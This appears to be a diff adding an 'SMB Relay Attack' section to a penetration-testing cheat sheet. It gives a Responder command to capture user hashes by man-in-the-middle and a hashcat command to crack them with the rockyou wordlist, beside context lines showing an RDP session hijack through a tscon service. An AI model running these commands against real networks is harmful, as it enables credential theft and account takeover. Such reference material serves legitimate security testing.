@@ -152,3 +152,16 @@ sc create sesshijack bipath="cmd.exe /k tscon <ID> /dest::rdp-tcp#<ID>"
 net start sesshijack
 ```
 
+### SMB Relay Attack
+
+Using responder we can do a MITM attack to get user hashes via SMB Relay.
+
+```bash
+responder -I eth0 -wdv
+```
+
+Crack the hashes
+
+```bash
+hashcat -m 5600 hashes.txt rockyou.txt
+```
